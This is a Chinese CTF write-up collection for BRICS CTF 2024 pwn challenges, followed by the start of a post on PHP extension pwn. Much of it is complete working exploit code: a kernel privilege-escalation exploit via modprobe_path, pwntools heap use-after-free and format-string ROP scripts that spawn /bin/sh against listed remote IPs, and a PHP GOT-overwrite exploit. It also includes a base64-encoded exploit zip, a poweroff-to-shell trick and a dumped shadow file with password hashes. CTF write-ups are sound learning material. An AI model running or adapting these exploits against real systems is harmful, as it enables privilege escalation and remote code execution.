U82VxSS5H+BjYV0R9l+tBP9N8BUEsBAh4DFAAAAAgA53YhWvSQ7ZisAwAAKCUAAAcAGAAAAAAAAAAAAO2BAAAAAGV4cGxvaXRVVAUAA9LmdGd1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBNAAAA7QMAAAAA// echo -n \"\"|\tbase64 -d &gt; exp.zip &amp;&amp; unzip exp.zip‍https://github.com/AvavaAYA/ctf-writeup-collection/tree/main/BRICSCTF-2024/physlercd sbinrm poweroffcat &lt;&lt; EOF &gt; ./poweroff ; chmod +x ./poweroff#!/bin/sh/bin/shEOF exit‍‍预期解法‍题目给了源代码​physler.c​#include \"physler.h\"static noinline long ioctlHandler(struct file *file, unsigned int cmd, unsigned long arg){    struct ioctl_map _map;    struct ioctl_write _write;    switch (cmd) {        case IOCTL_MAP_PHYS_ADDR: {            if (copy_from_user(&amp;_map, (void*)arg, sizeof(_map))) {                return -EFAULT;            }            if (mem)                iounmap(mem);            mem = ioremap(_map.phys_addr, _map.size);            if (!mem) {                return -EFAULT;            }            break;        }        case IOCTL_WRITE_PHYS_MEM: {            if (!mem)                return -EFAULT;            if (copy_from_user(&amp;_write, (void*)arg, sizeof(_write))) {                return -EFAULT;            }            size = _write.size;            if (size &gt; sizeof(kernel_buffer))                size = sizeof(kernel_buffer);            if (copy_from_user(kernel_buffer, (char *)_write.in_data, size))                return -EFAULT;            memcpy_toio(mem, kernel_buffer, size);            break;        }        default:            return -EINVAL;    }    return 0;}static int __init init_dev(void){    reg = misc_register(&amp;physler_dev);    if (reg &lt; 0)        printk(\"[-] Failed to register physler!\");    return 0;};static void __exit exit_dev(void){    misc_deregister(&amp;physler_dev);}module_init(init_dev);module_exit(exit_dev);​physler.h​#include &lt;linux/string.h&gt;#include &lt;linux/fs.h&gt;#include &lt;linux/slab.h&gt;#include &lt;linux/miscdevice.h&gt;#include &lt;linux/random.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/fs.h&gt;#include &lt;linux/ioctl.h&gt;#include &lt;linux/mm.h&gt;#include &lt;linux/uaccess.h&gt;#include &lt;linux/io.h&gt;#include &lt;linux/cdev.h&gt;#include &lt;linux/device.h&gt;#define IOCTL_MAP_PHYS_ADDR 0x1001#define IOCTL_READ_PHYS_MEM 0x2002#define IOCTL_WRITE_PHYS_MEM 0x3003#define BUF_SIZE 4096int reg;static unsigned long phys_addr = 0;static unsigned long size = 0;static void __iomem *mem = NULL;static char kernel_buffer[BUF_SIZE];static struct ioctl_map {    unsigned long phys_addr;    unsigned long size;};static struct ioctl_write {    unsigned long size;    unsigned char* in_data;};static noinline long ioctlHandler(struct file *file, unsigned int cmd, unsigned long arg);static int __init init_dev(void);static void __exit exit_dev(void);static struct file_operations physler_fops = {.unlocked_ioctl = ioctlHandler};struct miscdevice physler_dev = {    .minor = MISC_DYNAMIC_MINOR,    .name = \"physler\",    .fops = &amp;physler_fops,};MODULE_LICENSE(\"WTF\");MODULE_AUTHOR(\"kaker@keker\");MODULE_DESCRIPTION(\"Same shit different day\");‍关于ioremap  第一次接触这个，对这个不是太了解，下面是大模型 给出的 一下信息工作机制      ​​ioremap​​ 的作用:          将设备的物理内存地址（通常是 I/O 寄存器或内存映射区域）映射到内核虚拟地址空间中，供内核访问。      设备驱动程序需要通过这种方式访问硬件资源，而不是直接操作物理地址。            ​​iounmap​​ 的作用:          释放之前通过 ioremap​ 映射的内存区域。      内核的虚拟地址空间是有限的，尤其在 32 位系统上，因此释放不需要的映射是一个关键操作。      ‍​grok 2​在讨论 ioremap 和 “direct mapping of all physical memory (page_offset_base)” 之间的关系之前，我们需要理解这两个概念：  ioremap：如前所述，是用来将设备的物理 I/O 内存映射到内核的虚拟地址空间。这种映射通常不是直接的，而是通过内核的地址转换机制（使用页表等）来实现的，目的是为了访问硬件设备的内存。  direct mapping of all physical memory (page_offset_base)：这是指内核将物理内存直接映射到虚拟地址空间中的一种策略。在这种映射中，物理地址和虚拟地址之间的转换非常简单，通常只需要加上一个固定偏移量（page_offset_base），这在 Linux 内核中被称为线性映射或直接映射。具体来说，在 x86 体系结构上，内核的虚拟地址空间有一部分是用来直接映射物理内存的，这个映射通常从 PAGE_OFFSET 开始，任何在这一范围内的虚拟地址都对应一个物理地址，通过简单的加减 PAGE_OFFSET 就能得到对应的物理地址。关系：虽然 ioremap 和直接映射的概念在目的上是类似的（将物理地址转为内核可用的虚拟地址），但它们在实现和用途上有所不同：      不同点：          映射类型：ioremap 用于将设备的 I/O 内存映射到内核虚拟地址空间。这种映射可能不直接对应到物理内存的线性映射区域，它可以是非缓存的或有特定缓存属性的。      用途：ioremap 主要用于设备驱动程序，允许内核访问设备的内存空间，而直接映射（如 page_offset_base 所指）是内核对其自身内存使用的优化，使得内核可以快速访问大部分物理内存。      范围和持久性：直接映射通常是全局的，涵盖了系统的大部分物理内存，并且映射是静态的或在系统启动时设置好的。相比之下，ioremap 的映射是动态的，根据需要创建和销毁。            相似点：          目的：两者都用于将物理地址转换为内核可以访问的虚拟地址。      地址空间使用：它们都使用内核的虚拟地址空间，以提供对硬件或内存的访问。      总结来说，ioremap 和直接映射都是为了同一个目的——让内核可以安全、有效地访问物理地址，但它们在具体实现和应用场景上是有差异的。ioremap 提供了一种更灵活、适用于特定设备的访问方式，而直接映射则是对内核内存管理的一种优化策略。‍  通过上面的信息我大概可以理解了（以下仅是我个人观点）‍// phys_addr 传入物理地址（不是虚拟内存） // size 4k 对齐 0x1000size_t * mem = ioremap(_map.phys_addr, _map.size);// ioremap 会返回物理内存映射出的虚拟内存 地址​​‍  ​pwndbg​ 可以使用 vprot​ 查看虚拟内存，所展示的就是 虚拟内存​​‍可以修改 modprobe_path​物理内存（同时虚拟内存的内容也会被修改，因为它只是物理内存的映射）​​​​​​  确定 modprobe_path 的物理地址0xffff888000000000 # 物理内存映射的起始地址0xffff888002dd5820 #  +0x2dd5820 就是 modprobe_path 的映射地址，# 所以 modprobe_path 的物理内存 地址就是 0x2dd5820 ‍  exploit​​执行copy后，再次查看​​‍#include \"minilib.h\"#define stbase(value) ((value) - 0xffffffff81000000ULL)size_t nokaslr_kernel_base  = 0xffffffff81000000;char *procn = \"/dev/physler\";int fd = 0;static void shellcode(){    asm volatile (        \"xor rdi, rdi;\"        \"mov rcx, prepare_kernel_cred;\"        \"call rcx;\"        \"mov rcx, commit_creds;\"        \"call rcx;\"        // swapgs_restore_regs_and_return_to_usermode -- mov rdi,rsp    );    // restore_flags    asm volatile (        \"push user_ss;\"        \"push user_sp;\"        \"push user_rflags;\"        \"push user_cs;\"        \"push shell_addr;\"        \"swapgs;\"        \"iretq;\"    );}static void end_shellcode(){ return; }size_t sc_addr = &amp;shellcode + 8;struct ioctl_write {  char * in_data;  size_t size;};void add(struct ioctl_write buf){    ioctl(fd,0x1001, &amp;buf);}void edit(struct ioctl_write buf){    ioctl(fd, 0x3003, &amp;buf);}void doMain(){    // size_t sc_size = &amp;end_shellcode-&amp;shellcode;      save_status();    fd = open(procn,2);    lss(\"fd\",fd);    struct ioctl_write buf;    buf.in_data = 0x2dd5820;    buf.size = 0x1000;    add(buf);    char path[] = \"/tmp/e1\";    buf.in_data = 8;    buf.size = &amp;path;    edit(buf);    modprobe_rce();}extern void _start(){    size_t env[0];    environ = &amp;env[4];    doMain();    syscall64(60,0);}‍medium-chains漏洞触发点add_proxy('1',0x123) # 添加一个 代理​​​​‍add_chain(1,[0]) # 添加一个代理链​​‍delete_chain(0) # 删掉这个代理链,# chains[0] 指针清空, proxies[0]也被free,但是么没有把 proxies[0] 清空# 这就构成里一个UAF​​‍delete_proxy(0)​​​​‍‍‍  exploit 考验一点堆风水, 我瞎几把写的比较乱from pwn import *import sys# Define lambda functions for common operationss       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)rl      = lambda                    :io.recvline()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :ls('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))itr     = lambda                    :io.interactive()# Context settingscontext.arch      = 'amd64'context.log_level = 'debug' # infocontext.terminal  = ['tmux','splitw','-h','-l','170']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if   args.GDB: return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.CMD: return process(binary.split(' '))    elif args.REM: return remote('89.169.156.185', 13995)    elif args.AWD: return remote(sys.argv[1], int(sys.argv[2]))    '''     Usage: python3 exp.py AWD &lt;IP&gt; &lt;PORT&gt;   '''    return process([binary] + argv, *a, **kw)binary = './chains'elf  = ELF(binary);rop = ROP(binary)libc = elf.libcgdbscript = '''#continue#brva 0x01AD1brva 0x1314'''.format(**locals())import sockscontext.proxy = (socks.SOCKS5, '192.168.100.24', 10808)io = start(binary)def add(addr, port):    ru('&gt; ')    sl('1')    ru(': ')    sl(addr)    ru('Enter proxy port: ')    sl(str(port))def rm(idx):    ru('&gt; ')    sl('2')    ru(': ')    sl(str(idx))def chain(size,idl):    ru('&gt; ')    sl('3')    ru('chain size: ')    sl(str(size))    for i in range(size):        ru('proxy id: ')        sl(str(idl[i]))def show(idx):    ru('&gt; ')    sl('4')    ru(': ')    sl(str(idx))def rm_chain(idx):    ru('&gt; ')    sl('5')    ru(': ')    sl(str(idx))add('1',0x123)chain(1,[0])rm_chain(0)add('2',0x124)chain(1,[0])show(0)ru(' proxy #0 is ')heap_base = uu64(r(6)) - 0x2a0lss('heap_base')#show(0)#rm(0)#rm(0)#show(0)pay = b'A' * 0x10 + p64(0) + p64(0x451)add('33',0x22) # 2add(pay,0x23) # 3add('55',0x24) # 4chain(1,[2]) # 1chain(1,[2]) # 2chain(1,[2]) # 3rm_chain(1)chain(1,[3]) # 4chain(1,[3]) # 5rm(2)add(p64(heap_base+0x460),0) # 5add('pad1',0x1) # 6add('pad2',0x1) # 7add('pad3',0x1) # 8add('pad4',0x1) # 9add(p64(0x0)+p64(0x81),0x1) # 7rm_chain(4)add('pad4',0x1) # 10add('pad5',0x1) # 11rm(11)pay  = 0x48 * b'\\x00'pay += p64(0x21) + p64(heap_base + 0x530)add(pay,0x1) # 11#chain(1,[4]) # 6#chain(1,[4]) # 6##chain(1,[4]) # 6chain(1,[4])show(4)ru('is ')libc_base = uu64(r(6)) - 2112288lss('libc_base')libc.address = libc_baseenv = libc.sym['environ']rm(11)pay  = 0x48 * b'\\x00'pay += p64(0x21) + p64(env)add(pay,0x1) # 11show(4)ru('is ')stack = uu64(r(6)) - 8lss('stack')rm(11)pay  = 0x48 * b'\\x00'pay += p64(0x21) + p64(heap_base + 0x440)add(pay,0x1) # 11rm(6)rm(11)rm(4)#rm_chain(4)key = heap_base &gt;&gt; 0xCpay  = b'\\x00' * 0x18pay += p64(0x21) + p64((heap_base+0x20) ^ key) * 3pay += p64(0x91) + p64((stack-400) ^ key)add(pay,0x1) # 6add('pad',0x1) # 6#gdb.attach(io,gdbscript)system = libc.sym['system']bin_sh = next(libc.search(b'/bin/sh'))poprdi = next(libc.search(asm('pop rdi;ret')))ret = poprdi + 1pay = p64(ret) * 2 + p64(poprdi) + p64(bin_sh) + p64(system)ru('&gt; ')sl('1')ru(': ')sl(pay)lss('heap_base')lss('libc_base')lss('stack')itr()‍​​‍gollumgo 语言写的，给了源码+​tree​.├── build.sh├── cmd│   └── main.go├── database│   └── database.go├── Dockerfile├── go.mod├── models│   ├── credential.go│   └── user.go├── services│   └── auth.go└── util    └── hashes.go‍  先简单的写一下交互菜单‍‍Type Confusion 漏洞以下代码展示了一个类型混淆的简单场景：#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;// 定义两个不同的结构体typedef struct {    int id;    char name[20];} User;typedef struct {    int price;    char description[20];} Product;void type_confusion_demo(void* data, int is_user) {    if (is_user) {        // 假设 data 是一个 User 类型        User* user = (User*)data;        printf(\"User ID: %d\\n\", user-&gt;id);        printf(\"User Name: %s\\n\", user-&gt;name);    } else {        // 假设 data 是一个 Product 类型        Product* product = (Product*)data;        printf(\"Product Price: %d\\n\", product-&gt;price);        printf(\"Product Description: %s\\n\", product-&gt;description);    }}int main() {    // 创建一个 User 对象    User* user = (User*)malloc(sizeof(User));    user-&gt;id = 42;    strcpy(user-&gt;name, \"Alice\");    // 将 User 对象错误地当作 Product 类型处理    printf(\"Interpreting User as Product:\\n\");    type_confusion_demo(user, 0);    free(user);    return 0;}运行结果运行上述代码后，输出可能是类似以下内容：Interpreting User as Product:Product Price: 42Product Description: Alice为什么会这样？      内存布局问题：          在 User​ 和 Product​ 的定义中，id​ 和 price​ 都是 int​ 类型，占据相同的内存位置。      同样，name​ 和 description​ 的内存区域也重叠。            错误的类型解释：          实际上传递的 data​ 是一个 User​ 类型的指针，但在函数中将其当作 Product​ 类型来解释，导致内存被错误地解析。            潜在的危害：          如果数据结构的大小或布局不匹配，可能会访问到无效的内存区域，从而导致程序崩溃或未定义行为。      在更复杂的程序中，攻击者可以利用此漏洞伪造数据或执行任意代码。      ‍‍‍  官方wp#!/usr/bin/env python3import sysimport pwndef register(io: pwn.tube, username: bytes, password: bytes, protection: bytes) -&gt; None:    io.sendlineafter(b'&gt; ', b'REGISTER')    io.sendlineafter(b': ', username)    io.sendlineafter(b': ', password)    io.sendlineafter(b': ', protection)    returndef login(io: pwn.tube, username: bytes, password: bytes) -&gt; None:    io.sendlineafter(b'&gt; ', b'LOGIN')    io.sendlineafter(b': ', username)    io.sendlineafter(b': ', password)    returndef info(io: pwn.tube) -&gt; bytes:    io.sendlineafter(b'&gt; ', b'INFO')    return io.recvline()[4:]def update(io: pwn.tube, description: bytes) -&gt; None:    io.sendlineafter(b'&gt; ', b'UPDATE')    io.sendlineafter(b': ', description)    returndef logout(io: pwn.tube) -&gt; None:    io.sendlineafter(b'&gt; ', b'LOGOUT')    returndef exit(io: pwn.tube) -&gt; None:    io.sendlineafter(b'&gt; ', b'EXIT')    returndef main() -&gt; None:    IP = sys.argv[1] if len(sys.argv) &gt; 1 else 'localhost'    PORT = int(sys.argv[2]) if len(sys.argv) &gt; 2 else 17172    io = pwn.remote(IP, PORT)    # 0000000000402680 T syscall.RawSyscall6    for i in range(28):        register(io, f'x_{i}'.encode(), b'x', b'full')        logout(io)    register(io, b'x', b'x', b'full')    update(io, pwn.p64(0x0000000000402680) + pwn.p64(0))    logout(io)    login(io, b'x', b'x')    logout(io)    # pwn.pause()    payload = b'/bin/sh\\x00'    payload += b'A' * (0x400008 - len(payload))    register(io, payload, b'y', b'full')    io.interactive()if __name__ == '__main__':    main()‍‍HTB-vortex-user‍可以设置 env 和查看env, 设置 env 时会记录日志，然后查看日志存在 格式化字符串漏洞‍很幸运远程的ubuntu libc 和我本地的是一样的， 我是通过 格式化字符串漏洞 get shellfrom pwn import *import sys# Define lambda functions for common operationss       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)rl      = lambda                    :io.recvline()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :ls('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))itr     = lambda                    :io.interactive()# Context settingscontext.arch      = 'amd64'context.log_level = 'debug' # infocontext.terminal  = ['tmux','splitw','-h','-l','170']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if   args.GDB: return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.CMD: return process(binary.split(' '))    elif args.REM: return remote('89.169.156.185', 12850)    elif args.AWD: return remote(sys.argv[1], int(sys.argv[2]))    '''     Usage: python3 exp.py AWD &lt;IP&gt; &lt;PORT&gt;   '''    return process([binary] + argv, *a, **kw)binary = './cli'libelf = ''elf  = ELF(binary);rop = ROP(binary)libc = elf.libcgdbscript = '''brva 0x000001D4A#continue'''.format(**locals())#import socks#context.proxy = (socks.SOCKS5, '192.168.80.102', 10808)io = start(binary)def l():    ru('# ')    sl('ls')def env(cmd,n_env='',value=''):    ru('# ')    sl('env')    ru(': ')    sl(cmd)    if cmd == 'set':        ru(': ')        sl(n_env)        ru('value: ')        sl(value)    else:        ru(': ')        sl(n_env)def set_env(n_env,value):    env('set',n_env,value)def get_env(n_env,value):    env('get',n_env,value)def logs(pay1='',pay2=''):    ru('# ')    if pay1 == '':        sl('logs')    else:        s(pay1)    ru(': ')    if pay2 == '':        sl('view')    else:        s(pay2)set_env('env1',f'-&gt;%{6+0xb}$p-&gt;%{6 + 0x17}$p')logs()ru('-&gt;')stack = int(ru('-&gt;'),16) - 0x18libc_base = int(rl(),16) - 172490lss('libc_base')lss('stack')libc.address = libc_basesystem = libc.sym['system']bin_sh = next(libc.search(b'/bin/sh'))poprdi = next(libc.search(asm('pop rdi;ret')))ret = poprdi + 1rop = p64(poprdi+1) + p64(poprdi) + p64(bin_sh) + p64(system)rop = rop[:-2]for i in range(0,len(rop)):    n = (stack + i) &amp; 0xFF    if n != 0:        pay = f'%{0x100 - 24 + n}c%{6 + 0xb}$hhn'     else:        pay = f'%{0x100 - 24}c%{6 + 0xb}$hhn'    set_env('env1',pay)    n = rop[i]    if n != 0:        pay = f'%{0x100 - 24 + n}c%{6 + 0x13}$hhn'    else:        pay = f'%{0x100 - 24}c%{6 + 0x13}$hhn'    set_env('env1',pay)#gdb.attach(io,gdbscript)pay1 = b'logs'.ljust(0x8,b'\\x00') + p64(stack)pay2 = b'view'.ljust(0x8,b'\\x00') + p64(stack + 0x20)logs(pay1,pay2)lss('libc_base')lss('stack')itr()‍https://github.com/C4T-BuT-S4D/bricsctf-2024-quals/blob/master/tasks/htb/vortex-user/src/user/main.c‍  别人的 wp，学习一下哈哈#!/usr/bin/env python3import pwnpwn.context.terminal = ['tmux', 'splitw', '-h']def set_env(io: pwn.tube, name: bytes, value: bytes) -&gt; None:    io.sendlineafter(b\"# \", b\"env\")    io.sendlineafter(b\": \", b\"set\")    io.sendlineafter(b\": \", name)    io.sendlineafter(b\": \", value)def view_logs(io: pwn.tube, bebra: bytes = b'') -&gt; None:    io.sendlineafter(b\"# \", b\"logs\")    io.sendlineafter(b\": \", b\"view\\x00\\x00\\x00\\x00\" + bebra)def solve(io: pwn.tube, off: int) -&gt; None:    gdbscript = '''vmmap'''    # pwn.gdb.attach(io, gdbscript = gdbscript)    # get xetrov home listing and view db.conf file    # io.sendlineafter(b\"# \", b\"env\")    # io.sendlineafter(b\": \", b\"set\")    # io.sendlineafter(b\": \", b\"PWD\")    # io.sendlineafter(b\": \", b\"/home/xetrov\")    # io.sendlineafter(b\"# \", b\"ls\")    set_env(io, b'leak', b'%8$llx')    view_logs(io)    while True:        line = io.recvline()        if b'leak=' not in line:            continue        leak = line.strip().split(b'leak=')[1]        heap_base = int(leak, 16) - off        print(f'heap_base @ 0x{heap_base:x}')        break    target = heap_base + 0x2a20    set_env(io, b'content', b'%17$s')    # to steal creds    #set_env(io, b'DATEMSK', b'/home/xetrov/db.conf')    # to steal flag    set_env(io, b'DATEMSK', b'/home/xetrov/user.txt')    view_logs(io, pwn.p64(target))    io.recvuntil(b\"new env content=\")    print(io.recvuntil(b\"#\").decode())def main() -&gt; None:    #io = pwn.process('./cli')    for i in range(0, 0x100000, 0x10):        io = pwn.remote('0.0.0.0', 19191)        try:            solve(io, i)        finally:            io.close()if __name__ == '__main__':    main()‍HTB-vortex-system这道题目逆向分析也是挺有意思的，  AES      通过上面的 user 进去后 可以拿到 user.txt 和 db.conf(ssh 密码 用于 vortex system)    进去后 可以再 opt 目录下找打 待逆向的程序‍  逆向分析​​‍  时间戳生成部分和使用部分，怎么通过时间戳生成真正的AES 的过程看不懂，但是可以通过动态调试，去修改 time_c 的值 然后让自加密​​​​‍‍  主要加密逻辑​​‍‍​​​​‍  exploitfrom pwn import *from Crypto.Cipher import AES# backup_1728210186.zip# key 是通过时间戳 然后加密的， （文件名已经给了时间戳）key 可以动调出来key = p64(0x97c54b3a53cf9250) + p64(0x9eabdf1f04adaa12)data = open('backup_1728210186.zip','rb').read()rnum = 'ED DA 8A 22 83 D8 FA 0D 45 84 58 1C 8B F3 46 F9'.replace(' ','')rnum = bytes.fromhex(rnum)rnum = data[-0x10:]print(key)print(rnum)#aes = AES.new(key,AES.MODE_ECB) # ECBaes = AES.new(key,AES.MODE_ECB)zip = b''rnum = list(rnum)for i in range(0,len(data[:-0x10]),0x10):    x = data[i:i+0x10]    p1 = aes.decrypt(x)    n = b''    print(p1)    for i in range(len(rnum)):        n += p8(rnum[i] ^ p1[i])        rnum[i] = x[i]    zip += nprint(zip)open('flag.zip','wb').write(zip)‍‍​​‍  后面密码没爆破出来，😅😅😅😅😅😅, 爆出密码应该就可以直接ssh 连进去查看flag了root:$y$j9T$r/k4QwtXjjRDxxAaOaR190$cDHEIP9kaNIVoVtcv9vNwHqzrz0sAWeGzECWGDCSRb4:20001:0:99999:7:::daemon:*:19970:0:99999:7:::bin:*:19970:0:99999:7:::sys:*:19970:0:99999:7:::sync:*:19970:0:99999:7:::games:*:19970:0:99999:7:::man:*:19970:0:99999:7:::lp:*:19970:0:99999:7:::mail:*:19970:0:99999:7:::news:*:19970:0:99999:7:::uucp:*:19970:0:99999:7:::proxy:*:19970:0:99999:7:::www-data:*:19970:0:99999:7:::backup:*:19970:0:99999:7:::list:*:19970:0:99999:7:::irc:*:19970:0:99999:7:::_apt:*:19970:0:99999:7:::nobody:*:19970:0:99999:7:::ubuntu:!:19970:0:99999:7:::systemd-network:!*:20001::::::systemd-timesync:!*:20001::::::messagebus:!:20001::::::systemd-resolve:!*:20001::::::sshd:!:20001::::::xetrov:$y$j9T$XzjV7y9k5IDHF.3I78smb0$Q6xsk6ItHff./c6BuwxTfb.v7dCgjDbjxizUz7/mHv0:20001:0:99999:7:::‍  源代码 AES Chttps://github.com/C4T-BuT-S4D/bricsctf-2024-quals/blob/master/tasks/htb/vortex-system/src/system/aes.hpp‍‍ENDhttps://github.com/C4T-BuT-S4D/bricsctf-2024-quals"
  },
  
  {
    "title": "2024-05-31-PHP-So-Pwn",
    "url": "/posts/PHP-So-Pwn/",
    "categories": "CTF",
    "tags": "CTF",
    "date": "2024-05-31 00:00:00 +0800",
    





    
    "snippet": "‍基础的一些知识‍      最近打比赛 遇到了几道 php so 模块的 pwn 题，个人感觉挺有意思的        一般情况下会把php 大部分函数 ban 掉，只是用 自定义so 文件里的函数  ‍.so 文件的导出函数虽然里面函数名前面有zif_​ ,实际上调用的函数名是add_chunk()show_chunk()edit_chunk()edit_name()free_chunk...",
    "content": "‍基础的一些知识‍      最近打比赛 遇到了几道 php so 模块的 pwn 题，个人感觉挺有意思的        一般情况下会把php 大部分函数 ban 掉，只是用 自定义so 文件里的函数  ‍.so 文件的导出函数虽然里面函数名前面有zif_​ ,实际上调用的函数名是add_chunk()show_chunk()edit_chunk()edit_name()free_chunk()​​‍gdb调试方法(一种)  可以先把本地的 gdbserver 上次到docker, 能正常运行就行了​​  我只开了一个 docker 环境，正常情况下，他的ip 就是 这个加1 ,也就是 172.17.0.2​​​​​  然后用 gdbserver 启动​​​​  上面是调试的方法，‍函数传参分析  分析一下正常情况的状态&lt;?phpecho \"123\";echo \"123\";add_chunk(1,[0x23],\"name\");?&gt;  gdb 调试rdi 第一个参数可能是 传递参数的数量，rsi 可以通过该指针指向的字符数量来得知正确的参数数量(当前add_chunk) `lzz` 3个参数 类型​​‍  然后后面参数里的地址应该是用于存放我们传入参数的指针​​‍zend_parse_parameters‍  https://www.bookstack.cn/read/phpbook/7.1.md​最简单的获取函数调用者传递过来的参数便是使用zend_parse_parameters()函数。zend_parse_parameters()函数的前几个参数我们直接用内核里宏来生成便可以了，形式为：ZEND_NUM_ARGS() TSRMLS_CC，注意两者之间有个空格，但是没有逗号。从名字可以看出，ZEND_NUM_ARGS()代表着参数的个数。紧接着需要传递给zend_parse_parameters()函数的参数是一个用于格式化的字符串，就像printf的第一个参数一样。下面表示了最常用的几个符号。​‍  数字类型判断4 int6 strings7 arrary‍  类型 传擦和返回值，用于恢复结构int zend_parse_parameters(size_t arg_num, char *TypeChar, ...)      如果参数不是预期的数量和类型，zend_parse_parameters​ 会返回 -1 否则 0        简单了解下 lzz​ 是什么东东  b Booleanl Integer 整型d Floating point 浮点型s String 字符串r Resource 资源a Array 数组o Object instance 对象O Object instance of a specified type 特定类型的对象z Non-specific zval 任意类型～Z zval**类型f 表示函数、方法名称，PHP5.3之前没有的  然后是简单分析的图​​‍‍‍  这部分来自星盟安全的pwnshell wp‍bin_data_size的映射表，将宏定义展开为如下数组所示：uint32_t bin_data_size[] = {8, 16, 24, 32, 40, 48, 56, 64, 80, 96, 112, 128, 160, 192, 224, 256, 320, 384, 448, 512, 640, 768, 896, 1024, 1280, 1536, 1792, 2048, 2560, 3072 ...};‍‍‍‍  接下来来分析几道题目‍NumberGame  来自 第一届“长城杯”信息安全铁人三项赛决 夺取闯关 pwn numbergame‍‍题目环境‍  ​server.py​#!/usr/bin/python3import sysimport tempfileimport ossys.stdout.write(\"File size &gt;&gt; \")sys.stdout.flush()size = int(sys.stdin.readline().strip())if size &gt; 1024*1024:    sys.stdout.write(\"Too large!\")    sys.stdout.flush()    sys.exit(1)sys.stdout.write(\"Data &gt;&gt; \")sys.stdout.flush()script = sys.stdin.read(size)filename = tempfile.mktemp()with open(filename, \"w\") as f:    f.write(script)os.system(\"php \" + filename)  ​Dockerfile​FROM php:8.3-apacheRUN apt-get updateRUN apt-get upgrade -yRUN DEBIAN_FRONTEND=noninteractiveRUN apt install lib32z1 xinetd libstdc++6 lib32stdc++6 python3 -yRUN useradd -m ctfRUN echo \"ctf:ctf\" | chpasswdWORKDIR /home/ctfADD ynetd /home/ctfADD server.py /home/ctfADD run.sh /home/ctfCOPY ./php.ini /usr/local/etc/phpCOPY ./numberGame.so /usr/local/lib/php/extensions/no-debug-non-zts-20230831COPY ./readflag /COPY ./flag.txt /flag.txtRUN chmod 400 /flag.txtRUN chmod u+sx /readflagEXPOSE 5555CMD ./ynetd -p 5555 \"timeout 30 ./run.sh\"  然后 php.ini​ 基本上禁用了所有的php函数[PHP]disable_functions = \"system\",... disable_classes = \"\"...extension = numberGame.so ; 扩展的 so‍  给了 .tar.gz​ 的docker 镜像包，使用以下命令进行加载(线下比赛没有网络 给Dockerfile​ 也拉起不了，所以给打包的环境)docker load -i jingxiang.tar.gz​​  启动环境docker run --name run_numbergame  -p 5555:5555 -itd numbergame:latest‍分析 numberGame.so 漏洞‍​​​​​​​‍触发漏洞‍大致结构体struct mechunk{    size_t *name_ptr;    size_t num;    size_t array_size; // 默认 最大 100, 通过漏洞使这里变大，我们既可以实现数组越界 \t...;};‍正常情况下，array_size 是 4​​‍array_size 被改 ( 和quicksort 有关)，基本上使用 edit 时 idx 就没有限制了，只要知道 heap 地址和另一个地址，即可实现任意地址写​​‍exploit‍&lt;?php$heap_base = 0;$libc_base = 0;$libc = \"\";$mbase = \"\";function u64($leak){    $leak = strrev($leak);    $leak = bin2hex($leak);    $leak = hexdec($leak);    return $leak;}function p64($addr){    $addr = dechex($addr);    $addr = hex2bin($addr);    $addr = strrev($addr);    $addr = str_pad($addr, 8, \"\\x00\");    return $addr;}function leakaddr($buffer){    global $libc, $mbase;    $p = '/([0-9a-f]+)\\-[0-9a-f]+ .* \\/usr\\/lib\\/x86_64-linux-gnu\\/libc.so.6/';    $p1 = '/([0-9a-f]+)\\-[0-9a-f]+ .*  \\/usr\\/local\\/lib\\/php\\/extensions\\/no-debug-non-zts-20230831\\/numberGame.so/';    preg_match_all($p, $buffer, $libc);    preg_match_all($p1, $buffer, $mbase);    return \"\";}ob_start(\"leakaddr\");include(\"/proc/self/maps\");$buffer = ob_get_contents();ob_end_flush();leakaddr($buffer);echo \"\\n----1-----\\n\";add_chunk(5,[0,0,0,0x80000000,0],\"test1\"); # 需要构造好#add_chunk(1,[0],\"/bin/sh;\");add_chunk(1,[0],\"/bin/sh\");$rel = show_chunk(0); # 这里触发漏洞 vlun 会把数组控制的范围增大，然后 越界修改和泄露其他地方的值$heap = $rel[7];$heap += ($rel[8] &lt;&lt; 0x20); // 泄露 heap 地址$of = $heap - 72; # 数组起始#$str_got = hexdec($mbase[1][0])+ 0x4008; // 计算 strlen 的地址，##echo \"\\n----heap-----\\n\";echo dechex($heap);echo \"\\n----4-----\\n\";echo $libc[1][0];echo \"\\n----4-----\\n\";#$offset = ($str_got - $of) / 4;$system = (hexdec($libc[1][0]) + 0x4c490);echo $offset;edit_chunk(0,$offset,$system &amp; 0xffffffff); # 修改strlen_got表低四字节为 system//修改name 的时候 会先 strlen测量 name 的长度 strlen(\"/bin/sh\");edit_name(1,'1'); # ?&gt;‍‍​​‍PwnShell‍题目环境  DockerfileFROM php:8.3-apacheRUN apt-get updateRUN apt-get upgrade -yRUN DEBIAN_FRONTEND=noninteractiveRUN apt install vim -yCOPY ./stuff/php.ini /usr/local/etc/phpCOPY ./stuff/vuln.so /usr/local/lib/php/extensions/no-debug-non-zts-20230831COPY ./stuff/readflag /COPY ./flag.txt /flag.txtCOPY ./stuff/index.php /var/www/htmlRUN chmod 400 /flag.txtRUN chmod u+sx /readflagRUN chmod -R 777 /var/www/html‍  index.php, 用于上传 exp 